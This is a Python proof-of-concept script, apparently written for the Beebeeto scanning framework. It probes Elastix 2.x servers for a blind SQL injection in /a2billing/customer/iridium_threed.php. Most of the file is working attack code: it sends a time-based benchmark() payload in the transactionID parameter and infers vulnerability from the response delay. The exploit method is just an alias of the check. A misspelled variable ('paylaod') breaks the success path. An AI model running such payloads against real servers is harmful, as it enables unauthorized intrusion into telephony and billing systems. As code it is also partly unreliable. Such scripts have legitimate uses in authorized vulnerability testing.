#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import time
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0076',
            'name': 'Elastix 2.x /a2billing/customer/iridium_threed.php BLIND SQL注入漏洞 POC',
            'author': 'ca2fux1n',
            'create_date': '2015-03-15',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Elastix',
            'vul_version': ['2.x'],
            'type': 'SQL Injection',
            'tag': ['Elastix漏洞', 'SQL注入漏洞', '/iridium_threed.php', 'php'],
            'desc': '''
                    Vulnerable Source Code snippet in "a2billing/customer/iridium_threed.php"
                    ''',
            'references': ['http://www.exploit-db.com/exploits/36305/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/a2billing/customer/iridium_threed.php'
        payload = '?transactionID=-1 and 1=benchmark(2000000,md5(1))'
        start_time = time.time()
        if args['options']['verbose']:
            print '[+] Requset:' + verify_url
            print '[+] Payload:' + payload
        req = requests.get(verify_url + payload)
        if req.status_code == 200 and time.time() - start_time > 5:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url + paylaod
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())